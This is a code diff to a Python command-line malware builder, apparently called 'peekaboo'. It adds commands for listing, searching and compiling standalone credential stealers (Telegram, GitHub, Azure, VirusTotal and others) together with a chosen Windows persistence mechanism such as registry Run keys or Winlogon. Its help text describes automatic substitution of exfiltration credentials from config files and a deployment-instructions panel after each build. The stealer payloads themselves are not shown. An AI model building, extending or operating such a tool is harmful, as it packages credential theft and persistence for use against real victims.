@@ -1352,8 +1352,11 @@ the CLI builder (the dashboard handles them separately).
 | command               | description                                     |
 |-----------------------|-------------------------------------------------|
 | `list [filter]`       | list compilable modules; filter by platform/cat |
-| `search <query>`      | search by slug, T-ID, title or category         |
-| `build <slug>`        | compile module -- shows colorized compiler log  |
+| `list stealer`        | list standalone stealer modules                 |
+| `list persistence`    | list persistence mechanisms                     |
+| `search <query>`      | search meow modules + stealers simultaneously   |
+| `build <slug>`        | compile meow module -- colorized compiler log   |
+| `build <stealer>`     | compile stealer + choose persistence mechanism  |
 | `history [N]`         | last N builds from DB (default 20)              |
 | `show <build-id>`     | full compiler log for a specific build          |
 | `help [cmd]`          | show this help, or docs for a specific command  |
@@ -1363,8 +1366,18 @@ the CLI builder (the dashboard handles them separately).
 
     list windows       -- only Windows/MingW modules
     list linux         -- only Linux/GCC modules
+    list stealer       -- standalone stealers (angelcam, azure, bitbucket, github, telegram, virustotal)
+    list persistence   -- persistence mechanisms (registry_run, screensaver, filetype_hijack, winlogon)
     list injection     -- only modules in the injection category
-    list persistence   -- only persistence modules
+
+## Quick start
+
+    list stealer                    -- browse available stealers
+    build virustotal                -- compile virustotal stealer (prompts for persistence)
+    build telegram                  -- compile telegram stealer
+    list persistence                -- see all persistence options
+    search lazarus                  -- search meow modules + stealers for lazarus
+    history 10                      -- last 10 builds
 """,
         "list": """\
 ## list
@@ -1377,14 +1390,16 @@ Show a paginated table of compilable modules, with optional filter.
 
 **Parameters:**
 
-- `filter` -- optional; platform name (`windows`, `linux`) or partial category
-  name (`injection`, `persistence`, `evasion`, etc.)
+- `filter` -- optional; platform name (`windows`, `linux`), special keyword
+  (`stealer`, `persistence`), or partial category name (`injection`, `evasion`, etc.)
 
 **Examples:**
 
     list
     list windows
     list linux
+    list stealer
+    list persistence
     list injection
     list crypto
 
@@ -1394,12 +1409,14 @@ Show a paginated table of compilable modules, with optional filter.
 
 - 20 entries per page; press **Enter** to advance
 - Modules marked non-compilable (nasm, nim) are excluded
-- Use `build <slug>` to compile the selected module
+- `list stealer` shows the 6 standalone stealers from `malware/stealer/`
+- `list persistence` shows the 4 persistence mechanisms from `malware/persistence/`
+- Use `build <slug>` or `build <stealer-name>` to compile
 """,
         "search": """\
 ## search
 
-Search compilable modules by slug, title, T-ID or category.
+Search meow modules and standalone stealers simultaneously.
 
 **Usage:**
 
@@ -1407,41 +1424,66 @@ Search compilable modules by slug, title, T-ID or category.
 
 **Parameters:**
 
-- `query` -- case-insensitive; matches slug, title, T-ID prefix, or category
+- `query` -- case-insensitive; matches slug, title, T-ID, category (meow modules)
+  and stealer name (standalone stealers)
 
 **Examples:**
 
     search T1055
     search process injection
-    search hollowing
-    search nim
+    search telegram
+    search virustotal
+    search stealer
     search persistence
+
+**Output:**
+
+- Stealer matches shown first as a compact table (if any)
+- Meow module matches shown below as the standard paginated table
 
 **Notes:**
 
-- Results replace the current list and support paging
-- Non-compilable modules are excluded from results
+- Non-compilable meow modules are excluded from results
+- Stealer partial names match (e.g. `search viru` finds `virustotal`)
 """,
         "build": """\
 ## build
 
-Compile a module and save the output binary to `samples/<session-id>/`.
+Compile a meow module or a stealer and save output to `samples/<session-id>/`.
 
 **Usage:**
 
-    build <slug>
+    build <slug>           -- compile a meow module (injection, evasion, etc.)
+    build <stealer-name>   -- compile a stealer with optional persistence
 
 **Parameters:**
 
-- `slug` -- module slug from the list/search table; partial match supported
+- `slug`         -- module slug from `list` / `search`; partial match supported
+- `stealer-name` -- stealer name from `list stealer`; partial match supported
 
-**Examples:**
+**Examples (meow modules):**
 
     build malware-injection-17
     build malware-tricks-54
     build malware-evasion-12
 
-**Output:**
+**Examples (stealers):**
+
+    build virustotal
+    build github
+    build telegram
+    build viru          -- partial match, resolves to virustotal
+
+**Stealer build flow:**
+
+1. Persistence mechanism table is shown (name + description)
+2. Enter a persistence name from the table, or press Enter to skip
+3. Stealer is compiled  -> `samples/<session-id>/peekaboo.exe`
+4. If persistence chosen, it is compiled too -> `samples/<session-id>/persistence.exe`
+5. Deployment instructions panel is shown
+6. Build result saved to the peekaboo database
+
+**Output (meow module):**
 
 1. Pre-build summary: slug, platform, compiler, source file
 2. Compiler command and live log output (colorized)
@@ -1452,7 +1494,8 @@ Compile a module and save the output binary to `samples/<session-id>/`.
 - The original source files are never modified (copied to a temp dir)
 - Credential placeholders (Telegram token, GitHub PAT, etc.) are
   automatically substituted from `config/*.json` before compilation
-- Output binary lands in `samples/<session-id>/<slug>.exe` (Windows)
+- Stealer output: `samples/<session-id>/peekaboo.exe`
+- Meow module output: `samples/<session-id>/<slug>.exe` (Windows)
   or `samples/<session-id>/<slug>` (Linux)
 - The build result is saved to the peekaboo database automatically
 - If the compiler is not installed, an error is shown with the
@@ -4137,6 +4180,11 @@ def _render_history_table(builds: list[dict]) -> None:
         params  = b.get("params", {})
         if params.get("slug"):
             slug = params["slug"][:24]
+        elif params.get("malware") == "stealer":
+            s    = params.get("stealer", "")
+            pers = params.get("persistence", "")
+            slug = f"stealer/{s}" + (f"+{pers}" if pers and pers != "none" else "")
+            slug = slug[:28]
         elif params.get("malware") or params.get("injection"):
             parts = [params.get("malware",""), params.get("injection","")]
             slug  = "/".join(p for p in parts if p)[:24]
@@ -4352,6 +4400,22 @@ def run_builder() -> None:
                         f"  [dim]use  build <name>  to compile with persistence choice[/dim]\n"
                     )
                     continue
+                elif f == "persistence":
+                    t = Table(box=box.ASCII, show_header=True, header_style="heading",
+                              border_style="dim", padding=(0, 1),
+                              title=f"Persistence Mechanisms  ({len(pers_names)})")
+                    t.add_column("#",           style="dim",  min_width=3,  justify="right")
+                    t.add_column("name",        style="cmd",  min_width=18)
+                    t.add_column("description", style="dim",  min_width=46)
+                    t.add_column("source",      style="dim",  min_width=28)
+                    for i, n in enumerate(pers_names, 1):
+                        t.add_row(str(i), n, _PERS_DESC.get(n, ""), f"malware/persistence/{n}.c")
+                    console.print()
+                    console.print(t)
+                    console.print(
+                        f"  [dim]persistence is selected automatically during  build <stealer>[/dim]\n"
+                    )
+                    continue
                 elif f in ("windows", "linux", "macos"):
                     current_view = [m for m in all_mods if m["platform"] == f]
                     current_title = f"Compilable Modules: platform={f}"
@@ -4378,6 +4442,25 @@ def run_builder() -> None:
                 console.print("[warn][!] usage: search <query>[/warn]")
                 continue
             q = " ".join(args).lower()
+
+            # search stealers
+            st_hits = [n for n in stealer_names if q in n]
+            if st_hits:
+                t = Table(box=box.ASCII, show_header=True, header_style="heading",
+                          border_style="dim", padding=(0, 1),
+                          title=f"Stealer Matches  ({len(st_hits)})")
+                t.add_column("#",    style="dim", min_width=3, justify="right")
+                t.add_column("name", style="cmd", min_width=18)
+                t.add_column("source", style="dim", min_width=26)
+                for i, n in enumerate(st_hits, 1):
+                    t.add_row(str(i), n, f"malware/stealer/{n}.c")
+                console.print()
+                console.print(t)
+                console.print(
+                    f"  [dim]use  build <name>  to compile with persistence choice[/dim]\n"
+                )
+
+            # search meow modules
             hits = [
                 m for m in all_mods
                 if q in m["slug"].lower()
@@ -4385,15 +4468,15 @@ def run_builder() -> None:
                 or q in m["category"].lower()
                 or any(q in tid.lower() for tid in m["attack_ids"])
             ]
-            if not hits:
+            if hits:
+                current_view  = hits
+                current_title = f"Search: {q}"
+                current_page  = 0
+                total_pages   = _render_build_table(
+                    current_view, current_title, current_page
+                )
+            elif not st_hits:
                 console.print(f"  [warn][!] no results for '{q}'[/warn]\n")
-                continue
-            current_view  = hits
-            current_title = f"Search: {q}"
-            current_page  = 0
-            total_pages   = _render_build_table(
-                current_view, current_title, current_page
-            )
 
         # -- build <slug> -----------------------------------------------------
         elif cmd == "build":
@@ -4401,6 +4484,18 @@ def run_builder() -> None:
                 console.print("[warn][!] usage: build <slug>  (or: build <stealer-name>)[/warn]")
                 continue
             slug = args[0]
+
+            # partial stealer name match (e.g. "viru" -> "virustotal")
+            if slug not in stealer_set:
+                st_matches = [n for n in stealer_names if slug in n]
+                if len(st_matches) == 1:
+                    slug = st_matches[0]
+                elif len(st_matches) > 1:
+                    console.print(
+                        f"  [warn][!] ambiguous stealer '{slug}': "
+                        f"{', '.join(st_matches)}[/warn]\n"
+                    )
+                    continue
 
             # -- stealer build path -------------------------------------------
             if slug in stealer_set:
